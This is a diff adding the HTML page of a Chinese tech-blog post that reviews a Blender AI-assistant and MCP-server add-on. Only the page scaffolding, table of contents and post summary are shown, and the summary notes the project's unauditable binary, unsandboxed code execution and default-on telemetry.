@@ -1,0 +1,1068 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.daishengli.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":-1,"unescape":false,"preload":false,"trigger":"manual"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="这是一个 1763 star 的 MIT 协议 Blender 扩展，产品名 mcp-for-blender-pro，做两件事：把 ChatGPT、Claude、Gemini、Ollama 及自定义端点接进 Blender 3D 视图对话框，并内置一个跑在 127.0.0.1:9876 的 Streamable HTTP MCP 服务器，让 OpenCode、Cline 等外部客户端也能驱动场景。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bookwjitchieni1986&#x2F;blender-ai-mcp-addon：给 Blender 装一个能看场景、能干活、还能组队干活的 AI 助手">
+<meta property="og:url" content="https://www.daishengli.top/2026/11/20/bookwjitchieni1986-blender-ai-mcp-addon-ai-assistant-mcp-server/">
+<meta property="og:site_name" content="小戴的网络日志">
+<meta property="og:description" content="这是一个 1763 star 的 MIT 协议 Blender 扩展，产品名 mcp-for-blender-pro，做两件事：把 ChatGPT、Claude、Gemini、Ollama 及自定义端点接进 Blender 3D 视图对话框，并内置一个跑在 127.0.0.1:9876 的 Streamable HTTP MCP 服务器，让 OpenCode、Cline 等外部客户端也能驱动场景。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-11-20T16:20:00.000Z">
+<meta property="article:modified_time" content="2026-11-28T00:04:52.349Z">
+<meta property="article:author" content="小戴的网络日志">
+<meta property="article:tag" content="AI Agent">
+<meta property="article:tag" content="MCP">
+<meta property="article:tag" content="GitHub Trending">
+<meta property="article:tag" content="blender-ai-mcp-addon">
+<meta property="article:tag" content="bookwjitchieni1986">
+<meta property="article:tag" content="Blender">
+<meta property="article:tag" content="多智能体">
+<meta property="article:tag" content="3D 自动化">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://www.daishengli.top/2026/11/20/bookwjitchieni1986-blender-ai-mcp-addon-ai-assistant-mcp-server/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.daishengli.top/2026/11/20/bookwjitchieni1986-blender-ai-mcp-addon-ai-assistant-mcp-server/","path":"2026/11/20/bookwjitchieni1986-blender-ai-mcp-addon-ai-assistant-mcp-server/","title":"bookwjitchieni1986/blender-ai-mcp-addon：给 Blender 装一个能看场景、能干活、还能组队干活的 AI 助手"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>bookwjitchieni1986/blender-ai-mcp-addon：给 Blender 装一个能看场景、能干活、还能组队干活的 AI 助手 | 小戴的网络日志</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+<script async src="/lib/fireworks.js"></script>
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">小戴的网络日志</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">数字游民的思考碎片与生活切片</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">459</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">48</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">139</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91%E6%83%B3%E6%8A%8A-3D-%E5%BB%BA%E6%A8%A1%E8%BF%99%E4%BB%B6%E4%BA%8B%EF%BC%8C%E4%BB%8E%E2%80%9D%E6%8B%96%E9%BC%A0%E6%A0%87%E2%80%9D%E5%8F%98%E6%88%90%E2%80%9D%E8%AF%B4%E4%BA%BA%E8%AF%9D%E2%80%9D"><span class="nav-number">1.</span> <span class="nav-text">我想把 3D 建模这件事，从” 拖鼠标” 变成” 说人话”</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%85%88%E6%91%86%E4%BA%8B%E5%AE%9E%EF%BC%9A%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E9%A1%B9%E7%9B%AE"><span class="nav-number">1.1.</span> <span class="nav-text">一、先摆事实：这是一个什么样的项目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%AE%83%E5%88%B0%E5%BA%95%E8%A7%A3%E5%86%B3%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">二、它到底解决什么问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E7%AC%AC%E4%B8%80%E5%B1%82%EF%BC%9A%E8%AE%A9-LLM-%E8%83%BD%E2%80%9D%E7%9C%8B%E8%A7%81%E2%80%9D%E4%BD%A0%E7%9A%84%E5%9C%BA%E6%99%AF"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 第一层：让 LLM 能” 看见” 你的场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E7%AC%AC%E4%BA%8C%E5%B1%82%EF%BC%9A%E6%8A%8A%E5%AE%83%E5%8F%98%E6%88%90%E8%83%BD%E5%AF%B9%E5%A4%96%E6%9C%8D%E5%8A%A1%E7%9A%84%E4%B8%9C%E8%A5%BF"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 第二层：把它变成能对外服务的东西</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E2%80%9D%E5%8D%95%E4%BA%BA%E2%80%9D%E5%92%8C%E2%80%9D%E7%BB%84%E9%98%9F%E2%80%9D%EF%BC%9A%E4%B8%A4%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F"><span class="nav-number">1.3.</span> <span class="nav-text">三、” 单人” 和” 组队”：两种工作模式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-Single-assistant%EF%BC%9A%E6%99%AE%E9%80%9A%E5%AF%B9%E8%AF%9D"><span class="nav-number">1.3.1.</span> <span class="nav-text">3.1 Single assistant：普通对话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-Team-chain%EF%BC%9Amanager-worker-reviewer"><span class="nav-number">1.3.2.</span> <span class="nav-text">3.2 Team chain：manager &#x2F; worker &#x2F; reviewer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E4%B8%AA%E8%AE%BE%E8%AE%A1%E5%80%BC%E5%BE%97%E7%90%A2%E7%A3%A8"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.3 为什么这个设计值得琢磨</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%A8%A1%E5%9E%8B%E4%BB%8E%E5%93%AA%E6%9D%A5%EF%BC%9Aprovider-%E6%94%AF%E6%8C%81%E9%9D%A2"><span class="nav-number">1.4.</span> <span class="nav-text">四、模型从哪来：provider 支持面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%AE%98%E6%96%B9%E5%88%97%E5%87%BA%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.4.1.</span> <span class="nav-text">4.1 官方列出的服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E8%87%AA%E5%AE%9A%E4%B9%89%E7%AB%AF%E7%82%B9%E7%9A%84%E5%8D%8F%E8%AE%AE%E6%98%A0%E5%B0%84"><span class="nav-number">1.4.2.</span> <span class="nav-text">4.2 自定义端点的协议映射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E8%BF%9E%E6%8E%A5%E9%85%8D%E7%BD%AE%E6%80%8E%E4%B9%88%E7%AE%A1"><span class="nav-number">1.4.3.</span> <span class="nav-text">4.3 连接配置怎么管</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E7%9C%9F%E5%AE%9E%E5%B1%80%E9%99%90%EF%BC%9A%E8%BF%99%E4%BA%9B%E5%9D%91%E4%BD%A0%E5%BE%97%E7%9F%A5%E9%81%93"><span class="nav-number">1.5.</span> <span class="nav-text">五、真实局限：这些坑你得知道</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E6%9C%80%E5%A4%A7%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A%E4%BB%A3%E7%A0%81%E4%B8%8D%E5%85%AC%E5%BC%80"><span class="nav-number">1.5.1.</span> <span class="nav-text">5.1 最大的问题：代码不公开</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-execute-code-%E6%B2%A1%E6%9C%89%E6%B2%99%E7%AE%B1"><span class="nav-number">1.5.2.</span> <span class="nav-text">5.2 execute_code 没有沙箱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E9%81%A5%E6%B5%8B%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF"><span class="nav-number">1.5.3.</span> <span class="nav-text">5.3 遥测默认开启</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-Token-%E6%B6%88%E8%80%97%E8%BF%87%E5%BF%AB"><span class="nav-number">1.5.4.</span> <span class="nav-text">5.4 Token 消耗过快</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-5-%E8%BF%9E%E6%8E%A5%E5%B1%82%E9%9D%A2%E7%9A%84%E5%9D%91%EF%BC%88Windows-%E7%94%A8%E6%88%B7%E5%B0%A4%E5%85%B6%EF%BC%89"><span class="nav-number">1.5.5.</span> <span class="nav-text">5.5 连接层面的坑（Windows 用户尤其）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-6-Windows-x64-%E9%99%90%E5%AE%9A"><span class="nav-number">1.5.6.</span> <span class="nav-text">5.6 Windows x64 限定</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-7-%E4%B8%8A%E4%B8%8B%E6%96%87%E8%86%A8%E8%83%80%E7%9A%84%E9%9A%90%E6%82%A3"><span class="nav-number">1.5.7.</span> <span class="nav-text">5.7 上下文膨胀的隐患</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-8-%E7%BF%BB%E8%AF%91%E5%8F%AA%E8%A6%86%E7%9B%96%E4%BA%86%E4%B8%80%E5%8D%8A"><span class="nav-number">1.5.8.</span> <span class="nav-text">5.8 翻译只覆盖了一半</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-9-%E5%B0%8F%E7%BB%93%E4%B8%80%E4%B8%8B%E5%B1%80%E9%99%90"><span class="nav-number">1.5.9.</span> <span class="nav-text">5.9 小结一下局限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E5%92%8C%E5%90%8C%E7%B1%BB%E9%A1%B9%E7%9B%AE%E6%AF%94%EF%BC%9A%E5%AE%83%E5%88%B0%E5%BA%95%E7%AB%99%E5%9C%A8%E5%93%AA"><span class="nav-number">1.6.</span> <span class="nav-text">六、和同类项目比：它到底站在哪</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E4%B8%8A%E6%B8%B8%EF%BC%9Aahujasid-mcp-for-blender"><span class="nav-number">1.6.1.</span> <span class="nav-text">6.1 上游：ahujasid&#x2F;mcp-for-blender</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E4%B8%A4%E8%80%85%E7%9A%84%E5%85%B3%E9%94%AE%E5%B7%AE%E5%88%AB"><span class="nav-number">1.6.2.</span> <span class="nav-text">6.2 两者的关键差别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E5%92%8C%E5%85%B6%E4%BB%96%E8%A1%8D%E7%94%9F%E9%A1%B9%E7%9B%AE%E6%AF%94"><span class="nav-number">1.6.3.</span> <span class="nav-text">6.3 和其他衍生项目比</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E6%80%8E%E4%B9%88%E8%A3%85%E3%80%81%E6%80%8E%E4%B9%88%E7%94%A8"><span class="nav-number">1.7.</span> <span class="nav-text">七、怎么装、怎么用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E5%AE%89%E8%A3%85"><span class="nav-number">1.7.1.</span> <span class="nav-text">7.1 安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E8%BF%9E%E6%8E%A5%E6%A8%A1%E5%9E%8B"><span class="nav-number">1.7.2.</span> <span class="nav-text">7.2 连接模型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-%E4%B8%8A%E6%89%8B"><span class="nav-number">1.7.3.</span> <span class="nav-text">7.3 上手</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-4-README-%E7%BB%99%E7%9A%84%E5%9B%9B%E4%B8%AA%E8%AF%95%E7%94%A8-prompt"><span class="nav-number">1.7.4.</span> <span class="nav-text">7.4 README 给的四个试用 prompt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-5-%E9%85%8D%E5%A4%9A%E6%99%BA%E8%83%BD%E4%BD%93%E5%9B%A2%E9%98%9F"><span class="nav-number">1.7.5.</span> <span class="nav-text">7.5 配多智能体团队</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-6-%E6%8E%A5%E5%A4%96%E9%83%A8-MCP-%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-number">1.7.6.</span> <span class="nav-text">7.6 接外部 MCP 客户端</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E5%87%A0%E4%B8%AA%E6%88%91%E8%AE%A4%E4%B8%BA%E5%80%BC%E5%BE%97%E5%8D%95%E7%8B%AC%E6%8B%BF%E5%87%BA%E6%9D%A5%E8%AF%B4%E7%9A%84%E8%AE%BE%E8%AE%A1"><span class="nav-number">1.8.</span> <span class="nav-text">八、几个我认为值得单独拿出来说的设计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E5%AE%A1%E6%89%B9-%E5%8F%96%E6%B6%88-%E5%91%BD%E5%90%8D%E6%92%A4%E9%94%80%EF%BC%8C%E6%98%AF%E4%B8%89%E4%BB%B6%E4%B8%8D%E5%90%8C%E7%9A%84%E4%BA%8B"><span class="nav-number">1.8.1.</span> <span class="nav-text">8.1 审批 + 取消 + 命名撤销，是三件不同的事</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E4%B8%B2%E8%A1%8C-%E4%B8%80%E6%AC%A1%E7%BA%A0%E9%94%99%EF%BC%8C%E6%98%AF%E2%80%9D%E5%A4%9F%E7%94%A8%E2%80%9D%E8%80%8C%E9%9D%9E%E2%80%9D%E6%9C%80%E4%BC%98%E2%80%9D"><span class="nav-number">1.8.2.</span> <span class="nav-text">8.2 串行 + 一次纠错，是” 够用” 而非” 最优”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E8%A7%86%E5%8F%A3%E6%88%AA%E5%9B%BE%E6%98%AF%E5%AE%83%E7%9C%9F%E6%AD%A3%E7%9A%84%E6%A0%B8%E5%BF%83"><span class="nav-number">1.8.3.</span> <span class="nav-text">8.3 视口截图是它真正的核心</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-%E8%B5%84%E4%BA%A7%E6%BA%90%E7%9A%84%E9%80%89%E6%8B%A9"><span class="nav-number">1.8.4.</span> <span class="nav-text">8.4 资产源的选择</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E9%80%82%E5%90%88%E8%B0%81%EF%BC%8C%E4%B8%8D%E9%80%82%E5%90%88%E8%B0%81"><span class="nav-number">1.9.</span> <span class="nav-text">九、适合谁，不适合谁</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9-1-%E9%80%82%E5%90%88"><span class="nav-number">1.9.1.</span> <span class="nav-text">9.1 适合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-2-%E4%B8%8D%E9%80%82%E5%90%88"><span class="nav-number">1.9.2.</span> <span class="nav-text">9.2 不适合</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E6%88%91%E7%9A%84%E5%AE%9E%E9%99%85%E5%BB%BA%E8%AE%AE"><span class="nav-number">1.10.</span> <span class="nav-text">十、我的实际建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E6%9C%80%E5%90%8E%E8%AF%B4%E8%AF%B4%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E5%8F%8D%E6%98%A0%E5%87%BA%E7%9A%84%E4%B8%9C%E8%A5%BF"><span class="nav-number">1.11.</span> <span class="nav-text">十一、最后说说这个项目反映出的东西</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84%EF%BC%9A%E5%85%B3%E9%94%AE%E4%BA%8B%E5%AE%9E%E9%80%9F%E6%9F%A5"><span class="nav-number">1.12.</span> <span class="nav-text">附：关键事实速查</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="小戴的网络日志"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">小戴的网络日志</p>
+  <div class="site-description" itemprop="description">小戴的网络日志是一个专注于Java技术生态、全栈开发和大模型应用的个人技术博客，涵盖SpringBoot高并发优化、MySQL性能调优、Vue实战开发等硬核技术内容，同时分享技术团队管理、远程工作实践和程序员职业成长经验。作为数字游民的技术思考与生活记录，这里既有实战型的技术干货，也有关于效率工具和学习笔记的生活化分享。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">139</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">48</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">459</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/daishengli" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;daishengli" rel="noopener me" target="_blank">GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:daishengli1024@outlook.com" title="E-Mail → mailto:daishengli1024@outlook.com" rel="noopener me" target="_blank">E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://www.github.com/" title="https:&#x2F;&#x2F;www.github.com" rel="noopener" target="_blank">GitHub</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://deepseek.com/" title="https:&#x2F;&#x2F;deepseek.com" rel="noopener" target="_blank">DeepSeek</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.daishengli.top/2026/11/20/bookwjitchieni1986-blender-ai-mcp-addon-ai-assistant-mcp-server/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="小戴的网络日志">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小戴的网络日志">
+      <meta itemprop="description" content="小戴的网络日志是一个专注于Java技术生态、全栈开发和大模型应用的个人技术博客，涵盖SpringBoot高并发优化、MySQL性能调优、Vue实战开发等硬核技术内容，同时分享技术团队管理、远程工作实践和程序员职业成长经验。作为数字游民的技术思考与生活记录，这里既有实战型的技术干货，也有关于效率工具和学习笔记的生活化分享。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="bookwjitchieni1986&#x2F;blender-ai-mcp-addon：给 Blender 装一个能看场景、能干活、还能组队干活的 AI 助手 | 小戴的网络日志">
+      <meta itemprop="description" content="这是一个 1763 star 的 MIT 协议 Blender 扩展，产品名 mcp-for-blender-pro，做两件事：把 ChatGPT、Claude、Gemini、Ollama 及自定义端点接进 Blender 3D 视图对话框，并内置一个跑在 127.0.0.1:9876 的 Streamable HTTP MCP 服务器，让 OpenCode、Cline 等外部客户端也能驱动场景。2026 年 11 月 19 日建仓，同日发布 v1.0.0，压缩包 12.8 MB，1451 次下载。核心是 21 个场景工具，分场景检查、物体创建、编辑、可视反馈与脚本、Blender API 查询与导出、资产检索六组，集成 Poly Haven、Sketchfab、Poly Pizza 三个资产源。除了单助手模式，还提供 manager &#x2F; worker &#x2F; reviewer 三角色串行的 Team chain 多智能体工作流，带任务看板和一次纠错机会。要求 Windows x64 与 Blender 4.2 以上，捆绑 Python 3.13 运行时。短板同样明显：仓库只有 README 和两份文档，代码全在二进制压缩包里无法审计；exec 代码执行没有沙箱；遥测默认开启；Windows 专属限定与 Token 消耗过快是高频痛点。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          bookwjitchieni1986/blender-ai-mcp-addon：给 Blender 装一个能看场景、能干活、还能组队干活的 AI 助手
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-11-21 00:20:00" itemprop="dateCreated datePublished" datetime="2026-11-21T00:20:00+08:00">2026-11-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/" itemprop="url" rel="index"><span itemprop="name">开源项目</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">这是一个 1763 star 的 MIT 协议 Blender 扩展，产品名 mcp-for-blender-pro，做两件事：把 ChatGPT、Claude、Gemini、Ollama 及自定义端点接进 Blender 3D 视图对话框，并内置一个跑在 127.0.0.1:9876 的 Streamable HTTP MCP 服务器，让 OpenCode、Cline 等外部客户端也能驱动场景。2026 年 11 月 19 日建仓，同日发布 v1.0.0，压缩包 12.8 MB，1451 次下载。核心是 21 个场景工具，分场景检查、物体创建、编辑、可视反馈与脚本、Blender API 查询与导出、资产检索六组，集成 Poly Haven、Sketchfab、Poly Pizza 三个资产源。除了单助手模式，还提供 manager / worker / reviewer 三角色串行的 Team chain 多智能体工作流，带任务看板和一次纠错机会。要求 Windows x64 与 Blender 4.2 以上，捆绑 Python 3.13 运行时。短板同样明显：仓库只有 README 和两份文档，代码全在二进制压缩包里无法审计；exec 代码执行没有沙箱；遥测默认开启；Windows 专属限定与 Token 消耗过快是高频痛点。</div>
+        </div>
+      </header>
+
+    
+    
+    
